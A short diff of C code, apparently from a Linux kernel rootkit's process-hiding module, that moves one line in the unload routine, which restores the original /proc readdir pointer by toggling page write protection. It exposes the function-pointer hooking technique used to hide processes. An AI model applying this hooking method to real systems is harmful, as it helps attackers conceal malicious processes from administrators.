@@ -111,8 +111,8 @@ void unload_processhiding(void)
     struct file_operations *proc_fops = (struct file_operations *)proc->proc_fops;
     struct list_head *pos, *pos2;
     struct proc_to_hide* proc;
-    make_page_writable((long unsigned int) proc_fops);
 
+    make_page_writable((long unsigned int) proc_fops);
     proc_fops->readdir = proc_original_readdir;
     make_page_readonly((long unsigned int) proc_fops);
 
